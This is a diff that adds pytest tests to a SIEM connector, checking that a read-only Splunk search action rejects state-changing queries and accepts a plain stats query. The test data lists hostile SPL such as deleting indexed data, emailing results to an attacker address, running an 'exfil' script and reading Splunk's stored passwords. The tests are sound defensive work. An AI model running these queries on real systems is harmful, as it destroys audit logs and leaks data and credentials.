@@ -635,3 +635,35 @@ async def test_qradar_poller_401(db_session, org_a, monkeypatch) -> None:
     row = await _row(db_session, org_a.id, "qradar", {"base_url": "https://qradar.acme.example"}, {"sec_token": QRADAR_TOKEN})
     out = await cloud_poller.poll_qradar(db_session, row)
     assert out["status"] == "error" and row.error_message == "authentication rejected (HTTP 401)"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("spl", [
+    "index=main | delete",
+    "| collect index=summary",
+    "search sourcetype=auth | outputlookup evil.csv",
+    "index=main | sendemail to=attacker@example.com",
+    "| script python exfil",
+    "| rest /services/storage/passwords",
+    "index=main [ search index=x | delete ]",
+    "index=main |OUTPUTCSV dump",
+    "| savedsearch \"Nightly alert\"",
+])
+async def test_splunk_search_refuses_state_changing_spl(monkeypatch, spl: str) -> None:
+    """The ``search`` action is declared read-only (analysts can run it), so a
+    pipeline that would change Splunk state, run code or read Splunk's own
+    configuration never reaches the vendor."""
+    fake_vendor(monkeypatch, _refuse_everything)
+    out = await _connector("splunk").execute_action("search", {"search": spl})
+    assert out["status"] == "failed" and out["code"] == "invalid_parameters"
+    assert "read-only" in out["error"]
+
+
+@pytest.mark.asyncio
+async def test_splunk_search_allows_read_only_pipelines(monkeypatch) -> None:
+    seen = fake_vendor(monkeypatch, lambda request: httpx.Response(200, json={"results": [{"count": "3"}]}))
+    out = await _connector("splunk").execute_action(
+        "search", {"search": "index=main sourcetype=auth action=failure | stats count by user | sort -count"},
+    )
+    assert out["status"] == "success", out
+    assert len(seen) == 1 and seen[0].url.path == "/services/search/v2/jobs"
